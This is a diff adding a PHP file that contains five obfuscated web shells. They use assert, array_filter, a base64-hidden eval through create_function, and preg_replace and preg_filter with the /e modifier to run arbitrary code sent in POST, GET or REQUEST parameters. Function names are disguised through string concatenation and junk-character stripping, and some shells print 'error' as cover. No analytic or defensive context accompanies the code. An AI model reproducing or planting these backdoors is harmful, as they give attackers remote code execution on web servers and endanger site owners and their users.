@@ -1,0 +1,28 @@
+<?php
+@$A='Acc';$p='_';$o='PO';$s='S';$t='T';$a='as';$b='sert';$Acc=$a.$b;@${$A}(${$p.$o.$s.$t}[ziiuioxs]);
+echo 'error';exit;?>
+<?php
+@$ksvSGu= "\x73tr\x5f\x72e\x70l\x61\x63e";
+@$xRec= @$ksvSGu('wcaSq','','awcaSqrrwcaSqawcaSqywcaSq_filwcaSqter');
+@$SOet= @$ksvSGu('wZTB','','aswZTBsewZTBrwZTBt');
+@$xRec((array)@$_REQUEST['rretgscr'],@$SOet);
+?>
+<?php
+if($_GET['jumpvv']){
+$tu="TVFsnZG9vcnB5J";
+$mzd="10pOwoK";
+$fc="Cg";
+$tnz = str_replace("rn","","rnstrnrrn_rrnernprnlrnarncrne");
+$nu="pqldmqFsKCRfUE9";
+$qwb = $tnz("u", "", "ubuausue6u4u_udueucoudue");
+$lcq = $tnz("j","","jcrjejatej_jfujnjcjtjiojn");
+$htx = $lcq('', $qwb($tnz("q", "", $fc.$nu.$tu.$mzd))); $htx();}
+?>
+<?php
+@$EuTsNl="p"."r"."eg_r"."epla"."c"."e";
+@$EuTsNl("/[email]/e",$_POST['iiaqffg'],"error");
+?>
+<?php
+$ad = '|';$ad .='.';$ad .='*|';$ad .='e';
+@preg_filter('|.*|e', $_REQUEST['andyzhengs'], '');
+?>
